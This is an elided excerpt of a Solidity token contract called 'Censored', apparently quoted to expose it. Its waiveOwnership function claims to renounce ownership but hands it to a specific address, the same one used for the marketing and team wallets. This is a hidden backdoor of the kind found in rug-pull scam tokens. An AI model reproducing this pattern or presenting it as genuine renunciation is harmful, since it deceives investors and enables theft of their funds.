...
Elon tweet!: https://twitter.com/elonmusk/status/1650656867599671296?s=20
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xa6b6049CA5F21F95c275764024BcEe480307E7BB);
    }
...
contract Censored is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Censored";
    string private _symbol = "CENSORED";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xa6b6049CA5F21F95c275764024BcEe480307E7BB);
    address payable private teamWalletAddress = payable(0xa6b6049CA5F21F95c275764024BcEe480307E7BB);
    ...
    uint256 public _walletMax =     400000000000 * 10**_decimals;      
